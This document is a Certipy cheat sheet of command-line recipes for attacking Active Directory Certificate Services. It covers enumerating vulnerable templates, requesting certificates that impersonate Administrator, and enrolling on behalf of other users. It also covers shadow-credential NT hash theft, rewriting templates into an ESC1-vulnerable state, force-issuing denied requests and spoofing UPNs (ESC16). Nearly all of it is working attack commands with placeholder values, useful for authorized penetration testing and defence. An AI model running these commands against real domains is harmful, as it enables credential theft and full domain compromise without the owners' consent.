+++
title = "certipy"
+++

- https://github.com/ly4k/Certipy

## Installation

```bash
uv tool install certipy-ad
```

## Enumeration

```bash
# Enumerate vulnerable, enabled templates and CAs
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -enabled

# Enumerate using NT hash
certipy find -u <USER>@<DC_IP> -hashes <NT_HASH> -vulnerable -enabled
```

## Authentication

```bash
# Authenticate via PKINIT -- outputs NT hash, saves TGT as <name>.ccache
certipy auth -pfx <PFX_FILE> -dc-ip <DC_IP>

# Authenticate specifying username and domain (use when cert has no embedded UPN)
certipy auth -pfx <PFX_FILE> -u <USER> -domain <DOMAIN> -dc-ip <DC_IP>

export KRB5CCNAME=<NAME>.ccache
```

## Certificate Request

### Enroll with SAN

```bash
# Request a cert with SAN set to target UPN
certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>
```

### Enroll Base Certificate

```bash
# Enroll to obtain a certificate for the authenticated user (ESC2, ESC3 step 1)
certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME>
```

### Enroll on Behalf of User

```bash
# Use enrollment agent cert to enroll on behalf of another user (ESC2, ESC3 step 2)
certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -template User -pfx <AGENT_PFX> -on-behalf-of '<NETBIOS_DOMAIN>\<TARGET_USER>'
```

### Retrieve by Request ID

```bash
# Retrieve a previously issued certificate by Request ID (ESC7 step 5)
certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -retrieve <REQUEST_ID>
```

### Enroll with Hash Auth

```bash
# Request a certificate using NT hash authentication (ESC16)
certipy req -u <TARGET_USER> -hashes <NT_HASH> -dc-ip <DC_IP> -dns <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template User
```

## Shadow Credentials

```bash
# Write key credential to target account and retrieve NT hash via PKINIT
certipy shadow auto -u <USER> -p '<PASSWORD>' -dc-ip <DC_IP> -account <TARGET_USER>
```

## Template Management

### Save Template

```bash
# Back up current template configuration to <TEMPLATE_NAME>.json
certipy template -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -template <TEMPLATE_NAME> -save-old
```

### Write Default Configuration

```bash
# Overwrite template with ESC1-vulnerable (enrollee supplies subject) configuration
certipy template -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -template <TEMPLATE_NAME> -write-default-configuration
```

### Restore Template

```bash
# Restore original template configuration from saved backup
certipy template -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -template <TEMPLATE_NAME> -write-configuration <TEMPLATE_NAME>.json
```

## CA Management

### Add Officer

```bash
# Grant yourself Officer (ManageCertificates) role on the CA -- requires ManageCA
certipy ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -add-officer <USER>
```

### Enable Template

```bash
# Enable a template on the CA
certipy ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -enable-template <TEMPLATE_NAME>
```

### Issue Request

```bash
# Force-issue a denied certificate request by Request ID -- requires Officer role
certipy ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <TARGET_IP> -ca <CA_NAME> -issue-request <REQUEST_ID>
```

## Account Management

### Read Account

```bash
# Read target account's AD attributes (UPN, SPN, etc.)
certipy account -u <USER>@<DC_IP> -hashes <NT_HASH> -user <TARGET_USER> read
```

### Update UPN

```bash
# Update target account's UPN to impersonate another user (ESC16 -- UPN spoofing)
certipy account -u <USER>@<DC_IP> -hashes <NT_HASH> -user <TARGET_USER> -upn <IMPERSONATE_USER>@<DOMAIN> update
```

### Revert UPN

```bash
# Restore target account's UPN to its original value (ESC16 cleanup)
certipy account -u <USER>@<DC_IP> -hashes <NT_HASH> -user <TARGET_USER> -upn <TARGET_USER>@<DOMAIN> update
```
